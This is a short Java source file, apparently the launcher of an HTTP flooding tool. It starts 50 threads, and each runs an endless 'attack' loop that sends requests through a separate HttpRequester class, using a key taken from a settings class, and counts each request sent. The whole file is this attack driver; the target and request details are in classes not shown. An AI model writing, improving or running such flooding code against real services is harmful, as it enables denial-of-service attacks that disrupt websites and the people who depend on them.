import Handler.HttpRequester;

public class Run {
    public static void main(String[] args) {
        final HttpRequester httpRequester = new HttpRequester();
        try {
            for (int i = 0; i < 50; i++) {
                Thread thread = new Thread(new Runnable() {
                    public void run() {
                        try {
                            attack();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });
                thread.start();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void attack() {
        HttpRequester httpRequester = new HttpRequester();
        while (true) {
            try {
                httpRequester.run(SettingsConstant.key);
                System.out.print(SettingsConstant.count + ". ");
                SettingsConstant.count++;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

}
